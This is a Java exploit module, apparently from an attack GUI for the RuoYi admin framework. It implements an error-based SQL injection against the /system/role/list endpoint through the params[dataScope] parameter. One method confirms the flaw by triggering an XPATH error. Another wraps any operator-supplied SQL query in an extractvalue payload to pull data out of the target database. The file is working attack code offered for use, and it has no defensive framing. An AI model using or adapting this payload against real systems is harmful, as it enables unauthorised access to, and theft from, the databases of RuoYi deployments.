package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

public class ruoyi_system_role_sql implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        String CheckStr = "XPATH syntax error";
        String vul_uri = url + "/system/role/list";
        String payload = "params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))";
        try {
            CustomHttpClient req = new CustomHttpClient();
            CustomHttpClient.HttpResponse res = req.post(vul_uri, payload);

            if (res.getBody().contains(CheckStr)) {
                return new Result(true, "Ruoyi role list sql注入", "[SQL注入]\nURI:" + vul_uri + "\nDATA:" + payload);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi role list sql注入", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        String vul_uri = url + "/system/role/list";
        String payload = "params[dataScope]=and extractvalue(1,concat(0x7e,(" + cmd + "),0x7e))";
        try {
            CustomHttpClient req = new CustomHttpClient();
            String res = req.post(vul_uri, payload).getBody();
            return new Result(true, null, res);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}

